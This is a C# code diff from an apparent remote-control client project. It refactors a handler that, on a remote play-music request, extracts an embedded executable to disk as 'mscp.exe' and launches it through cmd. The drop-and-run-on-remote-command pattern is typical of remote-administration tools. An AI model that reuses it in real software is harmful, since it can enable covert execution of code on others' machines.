@@ -11,10 +11,10 @@ using RemoteControl.Protocals.Utilities;
 
 namespace RemoteControl.Client.Handlers
 {
-    class RequestPlayMusicHandler : IRequestHandler
+    class RequestPlayMusicHandler : AbstractRequestHandler
     {
         private static string lastPlayMusicExeFile = null;
-        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
+        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
         {
             if (reqType == ePacketType.PACKET_PLAY_MUSIC_REQUEST)
             {
@@ -33,11 +33,11 @@ namespace RemoteControl.Client.Handlers
             try
             {
                 // 释放音乐播放程序
-                byte[] data = ResUtil.GetResFileData("MusicPlayer.dat");
-                string musicPlayerFileName = ResUtil.WriteToRandomFile(data);
+                byte[] data = ResUtil.GetResFileData(RES_FILE_NAME);
+                string musicPlayerFileName = ResUtil.WriteToRandomFile(data,"mscp.exe");
                 lastPlayMusicExeFile = System.IO.Path.GetFileNameWithoutExtension(musicPlayerFileName);
                 // 启动音乐播放程序
-                ProcessUtil.Run("cmd.exe", "/c start " + musicPlayerFileName + " " + musicFilePath, true, false);
+                ProcessUtil.RunByCmdStart(musicPlayerFileName + " player " + musicFilePath, true);
             }
             catch (Exception ex)
             {
